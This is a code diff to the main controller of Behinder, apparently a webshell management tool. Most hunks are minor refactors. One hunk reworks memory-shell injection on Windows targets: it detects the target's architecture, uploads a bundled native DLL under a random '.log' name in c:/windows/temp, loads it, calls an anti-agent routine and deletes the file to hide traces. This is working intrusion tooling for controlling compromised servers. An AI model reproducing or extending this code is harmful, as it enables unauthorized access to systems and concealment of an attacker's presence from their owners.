@@ -18,6 +18,7 @@ import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
 import java.util.Optional;
+import java.util.Random;
 import java.util.regex.Pattern;
 import javafx.application.Platform;
 import javafx.beans.property.SimpleStringProperty;
@@ -63,7 +64,6 @@ import javafx.stage.Window;
 import net.rebeyond.behinder.core.Constants;
 import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.dao.ShellManager;
-import net.rebeyond.behinder.utils.StringUtils;
 import net.rebeyond.behinder.utils.Utils;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -267,10 +267,10 @@ public class MainController {
                if (!userNameText.getText().trim().equals("")) {
                   final String proxyUser = userNameText.getText().trim();
                   type = passwordText.getText();
-                  final char[] typeChars = type.toCharArray();
+                  final String finalType = type;
                   Authenticator.setDefault(new Authenticator() {
                      public PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(proxyUser, typeChars);
+                        return new PasswordAuthentication(proxyUser, finalType.toCharArray());
                      }
                   });
                } else {
@@ -434,7 +434,9 @@ public class MainController {
       Runnable runner = () -> {
          try {
             if (!path.startsWith("/")) {
-               Utils.showErrorMessage("错误", "路径必须以\"/\"开头");
+               Platform.runLater(() -> {
+                  Utils.showErrorMessage("错误", "路径必须以\"/\"开头");
+               });
                return;
             }
 
@@ -476,18 +478,37 @@ public class MainController {
                   this.statusLabel.setText("注入完成。");
                });
                if (osType == Constants.OS_TYPE_WINDOWS) {
-                  byte[] nativeLibraryFileContent = Utils.getFileData("/Users/rebeyond/JavaNative.dll");
-                  shellService.loadLibraryAndfreeFile(java.util.Base64.getEncoder().encodeToString(nativeLibraryFileContent), libPath);
+                  try {
+                     JSONObject basicInfoMap = new JSONObject(shellService.getBasicInfo(Utils.getWhatever()));
+                     String arch = (new String(Base64.decode(basicInfoMap.getString("arch")), "UTF-8")).toLowerCase();
+                     String remoteUploadPath = "c:/windows/temp/" + Utils.getRandomString((new Random()).nextInt(10)) + ".log";
+                     byte[] nativeLibraryFileContent;
+                     if (arch.toString().indexOf("64") >= 0) {
+                        nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x64.dll");
+                        shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
+                        shellService.freeFile(remoteUploadPath, libPath);
+                        shellService.antiAgent(remoteUploadPath);
+                        shellService.deleteFile(remoteUploadPath);
+                     } else {
+                        nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x32.dll");
+                        shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
+                        shellService.freeFile(remoteUploadPath, libPath);
+                        shellService.antiAgent(remoteUploadPath);
+                        shellService.deleteFile(remoteUploadPath);
+                     }
+                  } catch (Exception var18) {
+                     var18.printStackTrace();
+                  }
                }
-            } catch (Exception var14) {
+            } catch (Exception var19) {
                Platform.runLater(() -> {
-                  this.statusLabel.setText("注入完成，但是shell入库失败：" + var14.getMessage());
+                  this.statusLabel.setText("注入完成，但是shell入库失败：" + var19.getMessage());
                });
             }
-         } catch (Exception var15) {
-            var15.printStackTrace();
+         } catch (Exception var20) {
+            var20.printStackTrace();
             Platform.runLater(() -> {
-               this.statusLabel.setText("注入失败：" + var15.getMessage());
+               this.statusLabel.setText("注入失败：" + var20.getMessage());
             });
          }
 
@@ -522,8 +543,8 @@ public class MainController {
       this.idCol.setCellFactory((col) -> {
          TableCell cell = new TableCell() {
             @Override
-            protected void updateItem(Object item, boolean empty) {
-               super.updateItem(StringUtils.toStringEmpty(item), empty);
+            protected void updateItem(Object itemObj, boolean empty) {
+               super.updateItem(itemObj, empty);
                this.setText((String)null);
                this.setGraphic((Node)null);
                if (!empty) {
@@ -538,13 +559,13 @@ public class MainController {
       });
       this.statusCol.setCellFactory((col) -> {
          TableCell cell = new TableCell() {
-
             @Override
-            protected void updateItem(Object item, boolean empty) {
-               super.updateItem(StringUtils.toStringEmpty(item), empty);
+            protected void updateItem(Object itemObj, boolean empty) {
+               super.updateItem(itemObj, empty);
                if (empty) {
                   this.setGraphic((Node)null);
-               } else {
+               } else if(itemObj!=null){
+                  String item = itemObj.toString();
                   Object rowItem = this.getTableRow().getItem();
                   if (rowItem == null) {
                      this.setGraphic((Node)null);
@@ -571,7 +592,7 @@ public class MainController {
                         this.setAlignment(Pos.CENTER);
                      } catch (Exception var7) {
                         var7.printStackTrace();
-                        this.setText(StringUtils.toStringEmpty(item));
+                        this.setText(item);
                      }
 
                   }
@@ -1125,7 +1146,7 @@ public class MainController {
                JSONObject shellEntity = shells.getJSONObject(i);
 
                try {
-                  final Integer finalCount = count;
+                  final int finalCount = count;
                   Platform.runLater(() -> {
                      this.statusLabel.setText(String.format("正在导入%d/%d...", finalCount, shells.length()));
                   });
@@ -1138,8 +1159,8 @@ public class MainController {
                }
             }
 
-            final Integer finalDuplicateCount = duplicateCount;
-            final Integer finalCount = count;
+            final int finalDuplicateCount = duplicateCount;
+            final int finalCount = count;
             Platform.runLater(() -> {
                this.statusLabel.setText("导入完成。");
                Utils.showInfoMessage("提示", String.format("导入完成，共有%d条数据，%d条数据已存在，新导入%d数据，", shells.length(), finalDuplicateCount, finalCount));
